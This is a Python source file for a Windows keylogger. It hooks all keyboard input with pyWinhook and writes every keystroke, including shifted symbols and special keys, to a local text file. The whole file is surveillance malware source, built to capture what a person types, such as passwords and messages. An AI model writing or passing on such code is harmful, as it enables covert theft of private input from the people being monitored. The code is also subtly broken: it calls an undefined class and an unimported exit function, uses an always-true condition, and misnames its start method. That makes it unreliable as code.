import pythoncom
import pyWinhook

class KeyLogger:
    str = ""
    path = "fileKeyLog.txt"
    caps = 0
    shift = 0

    @staticmethod
    def str_log():
        with open(AppStart.path, 'r') as file:
            return file.read()

    class InterceptKeys:
        @staticmethod
        def on_key_event(event):
            if event.Ascii == 5:
                _exit(1)
            if event.Ascii != 0 or 8:
                with open(AppStart.path, 'a') as file:
                    if event.Ascii == 13:
                        file.write("Enter")
                    elif event.Ascii == 32:
                        file.write(" ")
                    elif event.Ascii == 8:
                        file.write("Backspace")
                    elif event.Ascii == 9:
                        file.write("Tab")
                    elif event.Ascii >= 48 and event.Ascii <= 57:
                        if AppStart.shift == 0:
                            file.write(chr(event.Ascii))
                        else:
                            shifted_char = ")"
                            if event.Ascii == 48:
                                shifted_char = ")"
                            elif event.Ascii == 49:
                                shifted_char = "!"
                            elif event.Ascii == 50:
                                shifted_char = "@"
                            elif event.Ascii == 51:
                                shifted_char = "#"
                            elif event.Ascii == 52:
                                shifted_char = "$"
                            elif event.Ascii == 53:
                                shifted_char = "%"
                            elif event.Ascii == 54:
                                shifted_char = "^"
                            elif event.Ascii == 55:
                                shifted_char = "&"
                            elif event.Ascii == 56:
                                shifted_char = "*"
                            elif event.Ascii == 57:
                                shifted_char = "("
                            file.write(shifted_char)
                    else:
                        if AppStart.shift == 0 and AppStart.caps == 0:
                            file.write(chr(event.Ascii).lower())
                        elif AppStart.shift == 1 and AppStart.caps == 0:
                            file.write(chr(event.Ascii).upper())
                        elif AppStart.shift == 0 and AppStart.caps == 1:
                            file.write(chr(event.Ascii).upper())
                        elif AppStart.shift == 1 and AppStart.caps == 1:
                            file.write(chr(event.Ascii).lower())
            return True

        @staticmethod
        def startKLog():
            hm = pyWinhook.HookManager()
            hm.KeyDown = InterceptKeys.on_key_event
            hm.HookKeyboard()
            pythoncom.PumpMessages()

    # InterceptKeys.start_klog()    
